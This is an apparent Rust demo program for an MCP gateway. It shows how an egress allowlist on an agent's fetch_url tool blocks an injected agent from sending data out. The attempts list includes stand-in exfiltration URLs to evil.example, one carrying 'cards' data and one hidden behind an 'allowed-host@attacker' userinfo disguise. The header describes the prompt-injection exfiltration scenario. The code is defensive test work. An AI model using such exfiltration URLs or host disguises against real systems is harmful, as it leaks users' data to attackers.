//! The egress allowlist, end to end. A toy server with a `fetch_url` tool is
//! put behind a token whose `url` argument is constrained to one host
//! (`host_in`). The agent may fetch the allowed host; a fetch to the attacker's
//! domain — the exfiltration step behind the 2026 Copilot flaws — is refused at
//! the gateway, before the server is called, and so is the classic
//! `allowed-host@attacker` disguise. No real network: `fetch_url` just echoes.
//!
//!   cargo run -p cleimesh-cli --example egress
//!
//! One binary, two roles: with `--fetch-server` it IS the wrapped MCP server;
//! without it, it is the demo driver.

use std::path::{Path, PathBuf};
use std::process::Stdio;

use anyhow::{anyhow, Context, Result};
use rmcp::model::{
    CallToolRequestParams, CallToolResponse, CallToolResult, ContentBlock, Implementation,
    ListToolsResult, PaginatedRequestParams, ServerCapabilities, ServerConfig, Tool,
};
use rmcp::service::RequestContext;
use rmcp::transport::{stdio, TokioChildProcess};
use rmcp::{ErrorData as McpError, RoleServer, ServerHandler, ServiceExt};
use serde_json::{json, Map, Value};

const ALLOWED: &str = "api.acme.example";

#[derive(Clone)]
struct FetchServer;

impl ServerHandler for FetchServer {
    fn get_info(&self) -> ServerConfig {
        ServerConfig::new(ServerCapabilities::builder().enable_tools().build())
            .with_server_info(Implementation::new("demo-fetch-server", env!("CARGO_PKG_VERSION")))
            .with_instructions("A toy fetch tool for the CleiMesh egress demo. Nothing is actually fetched.")
    }

    async fn list_tools(
        &self,
        _request: Option<PaginatedRequestParams>,
        _context: RequestContext<RoleServer>,
    ) -> Result<ListToolsResult, McpError> {
        let schema = match json!({
            "type": "object",
            "properties": { "url": { "type": "string" } },
            "required": ["url"],
        }) {
            Value::Object(m) => m,
            _ => Map::new(),
        };
        Ok(ListToolsResult::with_all_items(vec![Tool::new("fetch_url", "Fetch a URL and return its body", schema)]))
    }

    async fn call_tool(
        &self,
        request: CallToolRequestParams,
        _context: RequestContext<RoleServer>,
    ) -> Result<CallToolResponse, McpError> {
        let args = Value::Object(request.arguments.unwrap_or_default());
        let url = args.get("url").and_then(|v| v.as_str()).unwrap_or("?");
        Ok(CallToolResult::success(vec![ContentBlock::text(format!("fetched {url}"))]).into())
    }
}

async fn run_fetch_server() -> Result<()> {
    let service = FetchServer.serve(stdio()).await.map_err(|e| anyhow!("fetch server failed to start: {e}"))?;
    service.waiting().await.map_err(|e| anyhow!("fetch server stopped: {e}"))?;
    Ok(())
}

fn locate_cleimesh() -> Result<PathBuf> {
    if let Ok(p) = std::env::var("CLEIMESH") {
        return Ok(PathBuf::from(p));
    }
    let exe = std::env::current_exe().context("current_exe")?;
    exe.parent()
        .and_then(Path::parent)
        .map(|d| d.join("cleimesh"))
        .filter(|p| p.exists())
        .ok_or_else(|| anyhow!("cannot find the cleimesh binary; build it or set CLEIMESH=path/to/cleimesh"))
}

fn cleimesh(cli: &Path, dir: &Path, args: &[&str]) -> Result<()> {
    let status = std::process::Command::new(cli)
        .args(args)
        .current_dir(dir)
        .env("HOME", dir)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .with_context(|| format!("spawn cleimesh {}", args.join(" ")))?;
    if !status.success() {
        return Err(anyhow!("cleimesh {} failed", args.join(" ")));
    }
    Ok(())
}

fn cleimesh_out(cli: &Path, dir: &Path, args: &[&str]) -> Result<String> {
    let output = std::process::Command::new(cli)
        .args(args)
        .current_dir(dir)
        .env("HOME", dir)
        .stderr(Stdio::null())
        .output()
        .with_context(|| format!("spawn cleimesh {}", args.join(" ")))?;
    if !output.status.success() {
        return Err(anyhow!("cleimesh {} failed", args.join(" ")));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn text(result: &CallToolResult) -> String {
    result.content.iter().filter_map(|c| c.as_text()).map(|t| t.text.clone()).collect()
}

async fn run_demo() -> Result<()> {
    let cli = locate_cleimesh()?;
    let self_exe = std::env::current_exe().context("current_exe")?;
    let dir = std::env::temp_dir().join(format!("cleimesh-egress-{}", std::process::id()));
    std::fs::create_dir_all(&dir)?;

    println!("An egress allowlist on the agent's fetch tool. The injected agent can");
    println!("still call fetch_url — but only to the host the token names, not its own.\n");

    let peer = cleimesh_out(&cli, &dir, &["id", "--client", "--identity", "agent.key"])?;

    // The token grants fetch_url, but its `url` argument must have host api.acme.example.
    let tools = format!(r#"{{"fetch_url":{{"url":{{"constraint_type":"host_in","hosts":["{ALLOWED}"]}}}}}}"#);
    cleimesh(&cli, &dir, &["token", "issue", &peer, "--tools", &tools, "--identity", "node.key", "-o", "fetch.json"])?;
    println!("$ cleimesh token issue <agent> --tools '{{\"fetch_url\":{{\"url\":{{\"host_in\":[\"{ALLOWED}\"]}}}}}}'");
    println!("  fetch_url is granted, but only to {ALLOWED}.\n");

    let mut wrap = tokio::process::Command::new(&cli);
    wrap.current_dir(&dir).env("HOME", &dir).args([
        "mcp", "wrap", "--token", "fetch.json", "--holder", "agent.key",
        "--identity", "node.key", "--receipts", "receipts.jsonl", "--",
    ]);
    wrap.arg(&self_exe).arg("--fetch-server");
    let client = ()
        .serve(TokioChildProcess::new(wrap).context("start the wrapped server")?)
        .await
        .context("connect to the wrapped server")?;

    let attempts = [
        (format!("https://{ALLOWED}/v1/data"), "the allowed host"),
        ("https://evil.example/collect?data=cards".to_string(), "the attacker's domain"),
        (format!("https://{ALLOWED}@evil.example/collect"), "evil.example disguised with userinfo"),
    ];
    for (url, note) in attempts {
        let call = CallToolRequestParams::new("fetch_url").with_arguments(match json!({ "url": url }) {
            Value::Object(m) => m,
            _ => Map::new(),
        });
        let r = client.call_tool(call).await.map_err(|e| anyhow!("{e}"))?;
        let verdict = if r.is_error == Some(true) { "REFUSED".to_string() } else { format!("ok. {}", text(&r)) };
        println!("  agent> fetch_url {url}");
        println!("         ({note})  ->  {verdict}");
    }
    client.cancel().await.map_err(|e| anyhow!("{e}"))?;

    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).unwrap_or_default();
    println!("\n{} calls recorded. The allowed fetch went through; the two exfiltration", log.lines().count());
    println!("attempts were refused at the gateway, before the server ran. The agent's");
    println!("reach is the host the human signed, not the one an injection asks for.");

    let _ = std::fs::remove_dir_all(&dir);
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    if std::env::args().any(|a| a == "--fetch-server") {
        run_fetch_server().await
    } else {
        run_demo().await
    }
}
